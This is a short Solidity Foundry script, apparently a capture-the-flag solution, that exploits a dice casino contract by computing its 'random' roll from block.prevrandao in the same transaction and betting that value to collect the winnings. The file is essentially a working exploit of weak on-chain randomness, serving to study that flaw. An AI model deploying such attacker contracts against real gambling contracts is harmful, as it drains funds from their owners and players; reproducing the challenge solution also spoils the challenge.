// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "../Cheats.sol";
import "../../src/C5Dice.sol";

/// Predict the "random" roll in the same block and bet it.
contract DiceAttacker {
    function pwn(Casino c) external {
        uint256 r = uint256(keccak256(abi.encodePacked(block.prevrandao))) % 6 + 1;
        c.roll(r);
    }
    receive() external payable {}   // accept the winnings
}

contract SolveC5 is Script {
    function run() external {
        Casino casino = DiceSetup(vm.envAddress("SETUP")).casino();
        vm.startBroadcast();
        DiceAttacker a = new DiceAttacker();
        a.pwn(casino);
        vm.stopBroadcast();
    }
}
